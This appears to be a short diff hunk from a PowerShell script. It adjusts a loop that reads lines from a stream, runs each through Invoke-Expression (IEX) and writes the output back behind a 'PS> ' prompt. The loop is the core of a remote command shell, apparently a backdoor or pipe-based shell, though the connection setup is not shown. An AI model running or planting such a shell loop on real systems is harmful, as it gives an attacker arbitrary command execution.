@@ -35,12 +35,12 @@ $out_handle = New-Object Microsoft.Win32.SafeHandles.SafeFileHandle $handle_out,
 $fso = New-Object IO.FileStream $out_handle, ReadWrite
 $sw = New-Object IO.StreamWriter $fso
 $sw.AutoFlush=1
-$sw.Write("PS>")
+$sw.Write("PS> ")
 
 while (1) {
 	$o = IEX ($sr.ReadLine())
-	$sw.WriteLine($o)
-	$sw.Write("PS>")
+	$sw.WriteLine(($o | out-string))
+	$sw.Write("PS> ")
 }
 
 
